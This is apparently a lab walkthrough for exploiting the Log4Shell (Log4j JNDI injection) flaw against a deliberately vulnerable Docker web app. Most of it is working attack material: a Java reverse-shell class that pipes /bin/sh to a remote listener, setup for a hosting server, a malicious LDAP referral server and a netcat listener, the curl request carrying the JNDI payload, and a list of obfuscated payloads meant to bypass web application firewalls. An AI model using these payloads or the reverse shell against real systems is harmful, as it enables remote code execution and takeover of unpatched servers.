# log4jshell demonstration
log4j setup demonstration


# Setting up docker and running vulnerable web application on docker container
Install docker in kali linux

Then download the below repository

```
sudo git clone https://github.com/christophetd/log4shell-vulnerable-app.git
```

Then the run the below commands to start vulnerable web application on port 8080
```
sudo docker build . -t vulnerable-app
```
```
sudo docker run -p 8080:8080 --name vulnerable-app vulnerable-app
```
# Creating payload and setting up python server

Use below java code and save it as Exploit.java

Change the host and port details as you setup for nc listner

```javascript
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;

public class Exploit {

  public Exploit() throws Exception {
    String host="%s";
    int port=%s;
    String cmd="/bin/sh";
    Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
    Socket s=new Socket(host,port);
    InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();
    OutputStream po=p.getOutputStream(),so=s.getOutputStream();
    while(!s.isClosed()) {
      while(pi.available()>0)
        so.write(pi.read());
      while(pe.available()>0)
        so.write(pe.read());
      while(si.available()>0)
        po.write(si.read());
      so.flush();
      po.flush();
      Thread.sleep(50);
      try {
        p.exitValue();
        break;
      }
      catch (Exception e){
      }
    };
    p.destroy();
    s.close();
  }
}
```

Run the below command to build Exploit.class

Install javac package with below command
```
sudo apt install default-jdk
```
```
sudo javac Exploit.java -source 8 -target 8
```
```
sudo python3 -m http.server 8888
```
# Setting up LDAP server
```
sudo git clone https://github.com/mbechler/marshalsec.git
```
```
sudo mvn package -DskipTests
```
```
cd target
```
```
sudo java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://<IP_OF_PYTHON_SERVER_FROM_STEP_1>:8888/#Exploit"
```
setup netcat listner
```
sudo nc -lvp 9999
```
# will execute below payload to get a shell
```
curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://your-private-ip:1389/Exploit\}
```
# WAF bypass
```
${\u006a\u006e\u0064\u0069:ldap://your-private-ip:1389/Exploit\}
```
```
${${what:ever:-j}${some:thing:-n}${other:thing:-d}${and:last:-i}:ldap://your-private-ip:1389/Exploit\}
```
```
${${date:'j'}${date:'n'}${date:'d'}${date:'i'}:${date:'l'}${date:'d'}${date:'a'}${date:'p'}://your-private-ip:1389/Exploit\}
```
```
${j${${:-l}${:-o}${:-w}${:-e}${:-r}:n}di:ldap://your-private-ip:1389/Exploit\}
```
```
${jnd${sys:SYS_NAME:-i}:ldap://your-private-ip:1389/Exploit\}
```
```
${jnd${upper:ı}:ldap://your-private-ip:1389/Exploit\}
```
```
${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://your-private-ip:1389/Exploit\}
```
```
${${lower:j}ndi:${lower:l}${lower:d}a${lower:p}://your-private-ip:1389/Exploit\}
```
```
${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}${env:ENV_NAME:-l}dap${env:ENV_NAME:-:}//your-private-ip:1389/Exploit\}
```
